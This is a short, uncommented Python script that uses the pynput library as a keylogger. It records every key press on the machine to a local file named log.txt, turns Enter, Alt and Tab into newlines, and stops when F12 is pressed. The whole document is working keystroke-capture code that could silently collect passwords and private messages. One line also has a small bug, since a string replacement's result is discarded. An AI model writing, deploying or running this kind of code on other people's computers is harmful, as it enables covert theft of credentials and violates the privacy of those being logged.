from pynput.keyboard import Listener

def anonymous(key):
    key = str(key)
    if key == 'Key.f12':
        raise SystemExit(0)
    if key == 'Key.ctrl_l':
        key = ''
    if key == 'Key.ctrl_r':
        key = ''
    if key == 'Key.enter':
        key = '\n'
    if key == 'Key.alt_l':
        key = '\n'
    if key == 'Key.alt_r':
        key = '\n'
    if key == 'Key.tab':
        key = '\n'
    key.replace("'",'')
    with open('log.txt','a') as file:
        file.write(key)
    print(key)

with Listener(on_press = anonymous) as listener:
    listener.join()
    print(type(listener))